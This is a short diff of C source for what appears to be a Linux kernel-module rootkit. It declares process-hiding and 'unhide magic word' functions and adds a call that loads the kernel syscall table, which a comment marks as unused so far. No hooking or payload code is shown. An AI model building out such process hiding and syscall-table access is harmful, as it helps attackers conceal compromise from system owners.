@@ -35,6 +35,7 @@
 #error "Missing \'PROCNAME\' compilation directive. See Makefile."
 #endif
 
+
 extern void hide_task_by_pid(pid_t pid);
 extern void ntsh_list_saved_tasks(void);
 extern void ntsh_data_cleanup(void);
@@ -351,6 +352,7 @@ static void do_remove_proc(void) {
 
 static int __init ntsh_init(void) {
     int lock = 0;
+    struct kernel_syscalls *ksys;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
     kuid_t kuid;
     kgid_t kgid;
@@ -363,6 +365,8 @@ static int __init ntsh_init(void) {
     if(!get_unhide_magic_word())
         goto magic_word_error;
 
+    //XXX unused still, same as k_vfs_rmdir
+    ksys = kall_syscall_table_load();
 
 try_reload:
     ntshProcFileEntry = proc_create(PROCNAME, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
